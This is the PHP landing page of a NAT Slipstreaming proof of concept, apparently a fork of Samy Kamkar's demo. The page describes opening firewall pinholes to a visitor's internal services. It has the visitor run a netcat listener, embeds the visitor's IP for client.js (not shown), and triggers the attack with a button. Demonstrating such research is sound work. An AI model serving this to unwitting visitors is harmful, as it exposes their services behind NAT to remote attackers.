<html>
	<head>
		<title>Samy Kamkar - NAT Slipstreaming</title>
	</head>

	<body>
		
		<script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>

		<div id=acidburn style="visibility: hidden; position: absolute;"></div>

		<a href="https://samy.pl">https://samy.pl</a>
		||
		<a href="https://twitter.com/samykamkar">@samykamkar</a>
		||
		<a href="mailto:code@samy.pl">email me</a>
		
		<hr />

		<a href="https://samy.pl/slipstream/">NAT Slipstreaming</a>
		allows an attacker to remotely access any TCP/UDP services bound to a 
		victim machine, bypassing the victim's NAT/firewall (arbitrary firewall
		pinhole control), just by the victim visiting a website.
		<a href="https://samy.pl/slipstream/">Full writeup here.</a>
		
		<p>
			<a href="https://github.com/utfpr-cesc/slipstream/">
				github.com/utfpr-cesc/slipstream
			</a>
			: Ilicilho/Rui's fork of original NAT Slipstreaming PoC code by
			Samy Kamkar
		</p>

		<p>
			please run:<br>
			<?php 
				$port = @$_GET['port'] ? $_GET['port'] : 3306;
				$port = preg_replace("/[^0-9]/", "", $port); // to fix the xss issue
			?>
			<code>echo something here | (nc -vl <?php
				echo $port;
			?> || nc -vvlp <?php echo $port; ?>)</code>
		</p>
		<p>
			then hit the button below<br>
			<form name="woot">
				Port:
				<input
					id="port"
					type="text"
					name="port"
					value="<?php echo $port; ?>"
				/>
				&nbsp;
				<input
					disabled
					type="button"
					id="button"
					value="please wait"
					onClick="natpin()"
				/><p>
			</form>
		</p>

		<hr />
		<br />
		
		<pre id="log"></pre>

		<iframe name="A" style="display:none"></iframe>

		<?php
			function q2d($ip)
			{
				$ips = explode (".", $ip);
				return ($ips[3] + $ips[2] * 256 + $ips[1] * 256 * 256 + $ips[0] * 256 * 256 * 256); 
			}
			$ip = q2d(getenv('REMOTE_ADDR'));
		?>

		<script>
			var external = "<?php echo getenv('REMOTE_ADDR') ?>";
			var externalAsNumber = <?php echo $ip ?>;
		</script>
		<script src="client.js"></script>

	</body>
</html>
